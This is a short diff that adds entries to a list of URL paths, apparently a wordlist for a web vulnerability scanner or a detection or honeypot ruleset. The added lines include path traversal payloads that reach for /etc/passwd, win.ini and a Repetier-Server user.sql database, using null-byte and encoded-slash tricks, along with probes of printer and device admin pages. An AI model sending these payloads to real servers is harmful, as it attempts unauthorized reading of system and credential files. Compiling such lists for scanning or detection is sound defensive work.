@@ -29,3 +29,14 @@
 /api/status
 /wp-content/plugins/video-conferencing-with-zoom-api/README.txt
 /wp-content/plugins/bookit/readme.txt
+/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
+/views..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cProgramData%5cRepetier-Server%5cdatabase%5cuser.sql%20/base/connectionLost.php
+/installed_emanual_list.html
+/cgi-bin/dynamic/config/secure/security.html
+/SSI/Auth/ip_snmp.htm
+/hp/device/webAccess/index.htm?content=security
+/#!/printer/Prusa_I3/print
+/./../../../../../../../../../../etc/passwd
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
+/js/../../../../../../../../etc/passwd%00.jpg
+/installed_emanual_down.html?path=/manual/../../../etc/passwd
